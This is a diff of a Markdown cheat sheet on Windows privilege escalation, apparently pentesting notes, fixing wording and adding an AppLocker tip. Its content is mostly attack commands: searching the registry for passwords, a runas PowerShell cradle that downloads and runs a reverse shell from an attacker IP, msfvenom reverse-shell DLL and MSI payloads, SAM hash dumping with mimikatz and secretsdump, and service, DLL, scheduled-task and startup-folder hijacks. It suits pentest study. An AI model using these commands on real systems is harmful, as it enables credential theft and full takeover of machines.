@@ -78,7 +78,7 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
 # admin AutoLogon credentials:
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
 ### Runas with saved credentials
@@ -89,13 +89,12 @@ cmdkey /list
 
 # transfer a reverse shell and execute it with the credentials or directly with PS
 runas /savecred /user:admin reverse.exe
-runas /savecred /user:admin "powershell -c IEX (New-Object
-Net.Webclient).downloadstring('http://<ip>/rshell.ps1')"
+runas /savecred /user:admin "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://<ip>/rshell.ps1')"
 ```
 
 ### RunasCs
 
-Useful for executing commands as another user with explicit credentials when you can't access in any other way.
+Useful for executing commands as another user with explicit credentials when you can't access them in any other way.
 
 > <https://github.com/antonioCoco/RunasCs>
 
@@ -138,13 +137,13 @@ Get the hash
 pypykatz registry --sam sam system
 
 # or secretsdump
-impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
+impacket-secretsdump -system SYSTEM -sam SAM local # always mention 'local' in the command
 ```
 
 ### Dumping Local Hashes
 
 !!! info
-    Requires SYSTEM privs
+    Requires SYSTEM privileges
 
 ```shell
 .\mimikatz.exe
@@ -196,10 +195,10 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"
 
 # using icacls check all parts of the path
-# upload a malicious file to the path, for example, user can write on 'Current Version' folder so
+# upload a malicious file to the path, for example, if the user can write to the 'Current Version' folder:
 C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
 
-# upload the malicious file to that folder calling it 'current.exe'
+# upload the malicious file to that folder, naming it 'current.exe'
 # start the service
 sc start <svc_name>
 ```
@@ -223,10 +222,10 @@ HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl])
 # check for KEY_ALL_ACCESS
 accesschk /acceptula -uvwqk <path of registry> 
 
-# Service Information from regedit, identify the variable that holds the executable
+# Service Information from regedit, identify the variable that holds the executable path
 reg query <reg-path>
 
-# Imagepath is the variable here
+# ImagePath is the variable here
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 
 sc start <service>
@@ -243,13 +242,13 @@ echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
 type 'C:\FileZilla\FileZilla FTP Client\test.txt'
 ```
 
-Using Process Monitor, identify all DLLs loaded by the selected app as well as detect missing ones and try to replace one with a malicious file.
+Using Process Monitor, identify all DLLs loaded by the selected app as well as detect missing ones, and try to replace one with a malicious file.
 
 ```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack_box> LPORT=<lport> -f dll -o reverse.dll
 ```
 
-Transfer the malicious dll to the path and restart the service.
+Transfer the malicious DLL to the path and restart the service.
 
 ```shell
 sc stop <service>
@@ -263,8 +262,8 @@ sc start <service>
 schtasks /query /fo LIST /v
 Get-ScheduledTask | Select-Object TaskName, TaskPath, State
 
-# use icacls in the path to check perms
-icalcs <path>
+# use icacls in the path to check permissions
+icacls <path>
 
 # upload the malicious file and wait for execution
 ```
@@ -278,7 +277,7 @@ icalcs <path>
 # startup applications can be found here
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
 
-# check if folder is writable and transfer a reverse shell to it, the reboot the system
+# check if the folder is writable and transfer a reverse shell to it, then reboot the system
 shutdown /r /t 0
 ```
 
@@ -286,7 +285,7 @@ shutdown /r /t 0
 
 ```shell
 # check the privileged applications that are running from "TaskManager"
-# open one of them, and from the file menu click open and enter the following:
+# open one of them, and from the file menu click 'Open' and enter the following:
 file://c:/windows/system32/cmd.exe
 ```
 
@@ -314,19 +313,23 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 
 # check if the location is writable
-accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
+accesschk.exe /accepteula -wvu "<path>" # returns FILE_ALL_ACCESS
 
-# replace the executable with the reverse shell and wait for the Admin to login
+# replace the executable with the reverse shell and wait for the Admin to log in
 ```
 
 ### AlwaysInstallElevated
 
+!!! tip
+    Check policy if file is not being executed:
+    `Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections`
+
 ```shell
-# query the registry for keys, it should return 1 or Ox1
+# query the registry for keys, it should return 1 or 0x1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-# create a rev shell in msi format
+# create a reverse shell in MSI format
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi -o rshell.msi
 
 # run the installer to trigger the shell
@@ -379,7 +382,7 @@ reg save hklm\system .\system
 pypykatz registry --sam sam system
 
 # or secretsdump
-impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
+impacket-secretsdump -system SYSTEM -sam SAM local # always mention local in the command
 ```
 
 ### SeManageVolumePrivilege
